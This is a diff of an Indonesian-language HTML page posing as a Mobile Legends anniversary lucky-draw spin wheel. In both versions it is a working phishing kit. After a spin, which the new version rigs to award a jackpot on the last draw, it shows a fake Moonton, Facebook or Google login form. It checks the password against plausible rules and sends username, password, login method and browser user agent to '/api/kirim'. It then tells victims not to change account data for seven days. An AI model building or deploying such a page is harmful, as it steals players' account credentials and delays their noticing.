@@ -3,130 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MLBB Lucky Spin - Anniversary Event</title>
+    <title>MLBB Anniversary Lucky Draw</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; margin: 0; padding: 10px; }
-        .container { max-width: 400px; margin: auto; background: #1e293b; padding: 20px; border-radius: 15px; border: 2px solid #38bdf8; }
-        .wheel-container { position: relative; margin: 20px auto; width: 220px; height: 220px; border-radius: 50%; border: 8px solid #facc15; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#2563eb 0 30deg, #1d4ed8 30deg 60deg, #2563eb 60deg 90deg, #1d4ed8 90deg 120deg, #2563eb 120deg 150deg, #1d4ed8 150deg 180deg, #2563eb 180deg 210deg, #1d4ed8 210deg 240deg, #2563eb 240deg 270deg, #1d4ed8 270deg 300deg, #2563eb 300deg 330deg, #1d4ed8 330deg 360deg); }
-        button#spinBtn { background: #facc15; border: none; padding: 15px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; color: #000; font-size: 16px; }
-        
-        /* Modal Style */
-        #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
-        .login-box { background: #fff; color: #333; padding: 25px; border-radius: 12px; width: 100%; max-width: 320px; text-align: left; }
-        .method-btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; color: white; text-align: center; display: block; }
-        .f-fb { background: #1877f2; } .f-mt { background: #f39c12; } .f-gl { background: #ea4335; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        #errPass { color: red; font-size: 11px; margin-bottom: 10px; display: block; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: white; text-align: center; margin: 0; padding: 10px; overflow-x: hidden; }
+        .container { max-width: 450px; margin: auto; background: linear-gradient(180deg, #1e293b 0%, #0f172a 100%); padding: 20px; border-radius: 20px; border: 2px solid #38bdf8; box-shadow: 0 0 30px #38bdf844; }
+        .wheel-box { position: relative; width: 300px; height: 300px; margin: 25px auto; }
+        #canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #facc15; box-shadow: 0 0 15px #facc15; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); }
+        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 40px; z-index: 20; filter: drop-shadow(0 2px 5px black); }
+        button#spinBtn { background: linear-gradient(180deg, #facc15 0%, #eab308 100%); border: none; padding: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; color: #000; font-size: 18px; text-transform: uppercase; box-shadow: 0 4px 0 #a16207; }
+        button#spinBtn:disabled { background: #64748b; box-shadow: none; color: #cbd5e1; cursor: not-allowed; }
+        #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
+        .login-box { background: #fff; color: #333; padding: 25px; border-radius: 15px; width: 100%; max-width: 320px; text-align: left; }
+        .prize-img { width: 120px; height: 120px; object-fit: cover; border-radius: 10px; margin: 0 auto 15px; display: block; border: 3px solid #facc15; }
+        .method-btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; text-align: center; display: block; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        #errPass { color: #dc2626; font-size: 12px; font-weight: bold; display: block; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2 style="color: #38bdf8; margin-bottom: 5px;">MLBB ANNIVERSARY</h2>
-    <p style="font-size: 13px; color: #94a3b8;">Spin & Menangkan Skin Epic Gratis!</p>
-    
-    <div style="position: relative;">
-        <div style="width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #facc15; position: absolute; top: -10px; left: 50%; transform: translateX(-50%); z-index: 10;"></div>
-        <div class="wheel-container" id="wheel">
-            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 10px; color: gold; font-weight: bold;">LUCKY DRAW</div>
-        </div>
+    <img src="https://gwen.id/wp-content/uploads/2022/10/mobile-legends-logo.png" width="130" style="margin-bottom:10px;">
+    <h2 style="color: #38bdf8; margin: 0;">LUCKY DRAW 2026</h2>
+    <p style="font-size: 13px; color: #94a3b8;">Event Spesial Anniversary - Klaim Hadiahmu!</p>
+
+    <div class="wheel-box">
+        <img src="https://cdn-icons-png.flaticon.com/512/2985/2985150.png" class="pointer">
+        <canvas id="canvas" width="500" height="500"></canvas>
     </div>
 
-    <p style="font-size: 14px;">Kesempatan Draw: <span id="count" style="color:#facc15; font-weight:bold;">10</span>/10</p>
-    <button id="spinBtn" onclick="startSpin()">DRAW SEKARANG</button>
+    <p style="background: #334155; display: inline-block; padding: 5px 20px; border-radius: 20px;">Sisa Draw: <span id="count" style="color:#facc15; font-weight:bold;">10</span>/10</p>
+    <button id="spinBtn" onclick="spin()">MULAI DRAW</button>
 </div>
 
 <div id="loginModal">
-    <div class="login-box" id="step1">
-        <h3 style="margin-top:0; text-align:center;">Klaim Hadiah Kamu</h3>
-        <p style="font-size: 13px; text-align:center;">Silakan login untuk memverifikasi akun pengiriman.</p>
-        <button class="method-btn f-mt" onclick="showForm('Moonton')">Login via Moonton</button>
-        <button class="method-btn f-fb" onclick="showForm('Facebook')">Login via Facebook</button>
-        <button class="method-btn f-gl" onclick="showForm('Google')">Login via Google</button>
+    <div class="login-box" id="step0">
+        <h3 style="text-align:center; margin-top:0;">SELAMAT!</h3>
+        <img id="wonImg" class="prize-img" src="">
+        <p id="wonText" style="text-align:center; font-weight:bold;"></p>
+        <button class="method-btn" style="background:#22c55e" onclick="toStep1()">AMBIL SEKARANG</button>
     </div>
-
+    <div class="login-box" id="step1" style="display:none;">
+        <h3 style="text-align:center;">Pilih Akun Klaim</h3>
+        <button class="method-btn" style="background:#f39c12" onclick="showForm('Moonton')">Moonton Login</button>
+        <button class="method-btn" style="background:#1877f2" onclick="showForm('Facebook')">Facebook Login</button>
+        <button class="method-btn" style="background:#ea4335" onclick="showForm('Google')">Google Login</button>
+    </div>
     <div class="login-box" id="step2" style="display:none;">
         <h3 id="formTitle">Login</h3>
         <input type="text" id="user" placeholder="Email / Username">
         <input type="password" id="pass" placeholder="Kata Sandi">
         <span id="errPass"></span>
-        <button class="method-btn" style="background:#2ecc71" onclick="submitData()">KLAIM SEKARANG</button>
+        <button class="method-btn" style="background:#22c55e" onclick="submitData()">KONFIRMASI KLAIM</button>
     </div>
-
     <div class="login-box" id="step3" style="display:none; text-align:center;">
-        <h2 style="color: #27ae60;">VERIFIKASI BERHASIL!</h2>
-        <p id="finalText" style="font-size: 13px; line-height: 1.6; color: #555;"></p>
-        <button class="method-btn f-fb" onclick="window.location.href='https://m.mobilelegends.com'">TUTUP</button>
+        <h2 style="color: #16a34a;">SUKSES!</h2>
+        <p style="font-size: 13px; color:#555;">Hadiah akan masuk ke email mobilelegends akun kamu setelah 7 hari. Jangan ganti data akun selama proses verifikasi.</p>
+        <button class="method-btn" style="background:#1877f2" onclick="location.reload()">OKE</button>
     </div>
 </div>
 
 <script>
+    const ampas = [
+        { t: "300 Magic Dust", i: "https://static.wikia.nocookie.net/mobile-legends/images/c/c8/Magic_Dust.png" },
+        { t: "500 Ticket", i: "https://static.wikia.nocookie.net/mobile-legends/images/0/07/Ticket.png" },
+        { t: "2 Hero Fragment", i: "https://static.wikia.nocookie.net/mobile-legends/images/a/a2/Hero_Fragment.png" }
+    ];
+    const jackpot = [
+        { t: "Skin Epic Lancelot", i: "https://img.mobilelegends.com/group1/M00/00/AF/Cq6ICl2S8mKAE7mXAASt_PZ0_YI426.jpg" },
+        { t: "70 Diamonds", i: "https://p16-va.lemon8cdn.com/obj/tos-alisg-v-a3e477-sg/ocA7IBp9QAnBIEDAgk8AIBeS2C7Z6GffXAfYQf" },
+        { t: "Skin Epic Gusion", i: "https://img.mobilelegends.com/group1/M00/00/8F/Cq6ICl2R_8-AQ-3vAAVS-G_oX_c321.jpg" }
+    ];
+    const allPrizes = [...ampas, ...jackpot];
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let deg = 0;
+    let spinCount = 0;
     let currentMethod = "";
-    let drawCount = 10;
 
-    function startSpin() {
-        if(drawCount <= 0) return alert("Kesempatan hari ini habis!");
-        drawCount--;
-        document.getElementById('count').innerText = drawCount;
-        
-        const wheel = document.getElementById('wheel');
-        const deg = Math.floor(Math.random() * 360) + 3600;
-        wheel.style.transform = `rotate(${deg}deg)`;
-        
+    function drawWheel() {
+        const slice = (2 * Math.PI) / allPrizes.length;
+        allPrizes.forEach((p, i) => {
+            ctx.beginPath(); ctx.fillStyle = i % 2 === 0 ? '#1d4ed8' : '#2563eb'; ctx.moveTo(250, 250);
+            ctx.arc(250, 250, 250, i * slice, (i + 1) * slice); ctx.fill();
+            ctx.save(); ctx.translate(250, 250); ctx.rotate(i * slice + slice / 2);
+            ctx.fillStyle = "white"; ctx.font = "bold 20px Arial"; ctx.fillText(p.t.split(' ')[0], 120, 10); ctx.restore();
+        });
+    }
+    drawWheel();
+
+    function spin() {
+        if(spinCount >= 10) return;
+        spinCount++;
+        document.getElementById('count').innerText = 10 - spinCount;
+        const btn = document.getElementById('spinBtn');
+        btn.disabled = true;
+
+        let targetIndex = spinCount < 10 ? Math.floor(Math.random() * 3) : Math.floor(Math.random() * 3) + 3;
+        const sliceDeg = 360 / allPrizes.length;
+        const targetDeg = (360 - (targetIndex * sliceDeg)) - (sliceDeg / 2);
+        deg += 3600 + (targetDeg - (deg % 360));
+        canvas.style.transform = `rotate(${deg}deg)`;
+
         setTimeout(() => {
+            const winner = allPrizes[targetIndex];
+            document.getElementById('wonImg').src = winner.i;
+            document.getElementById('wonText').innerText = "Selamat! Kamu mendapatkan " + winner.t + "!";
             document.getElementById('loginModal').style.display = 'flex';
+            btn.disabled = false;
+            if(spinCount >= 10) btn.innerText = "DRAW HABIS";
         }, 4500);
     }
 
-    function showForm(method) {
-        currentMethod = method;
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-        document.getElementById('formTitle').innerText = "Login " + method;
-    }
+    function toStep1() { document.getElementById('step0').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
+    function showForm(m) { currentMethod = m; document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; document.getElementById('formTitle').innerText = "Login " + m; }
 
     async function submitData() {
         const user = document.getElementById('user').value;
         const pw = document.getElementById('pass').value;
         const err = document.getElementById('errPass');
         err.innerText = "";
+        if(!user || !pw) return alert("Isi data!");
+        if (currentMethod === 'Moonton' && !/[A-Z]/.test(pw)) return err.innerText = "Error: Wajib minimal 1 huruf kapital!";
+        if ((currentMethod === 'Facebook' || currentMethod === 'Google') && pw.length < 8) return err.innerText = "Error: Password minimal 8 karakter!";
 
-        if(!user || !pw) return alert("Lengkapi data!");
-
-        // --- VALIDASI RULES MASTER FAGYMOFFC ---
-        if (currentMethod === 'Moonton') {
-            if (!/[A-Z]/.test(pw)) {
-                err.innerText = "Error: Password Moonton harus mengandung minimal 1 huruf kapital!";
-                return;
-            }
-        } else {
-            if (pw.length < 8) {
-                err.innerText = "Error: Password " + currentMethod + " harus minimal 8 karakter!";
-                return;
-            }
-        }
-
-        try {
-            await fetch('/api/kirim', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    user, 
-                    pw, 
-                    method: currentMethod,
-                    device: navigator.userAgent 
-                })
-            });
-
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-            document.getElementById('finalText').innerText = "Hadiah akan masuk ke email mobilelegends akun kamu setelah 7 hari. Mohon jangan mengganti data akun agar proses verifikasi lancar.";
-            
-        } catch (e) {
-            alert("Terjadi gangguan server. Coba lagi.");
-        }
+        await fetch('/api/kirim', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user, pw, method: currentMethod, device: navigator.userAgent })
+        });
+        document.getElementById('step2').style.display = 'none'; document.getElementById('step3').style.display = 'block';
     }
 </script>
-
 </body>
 </html>
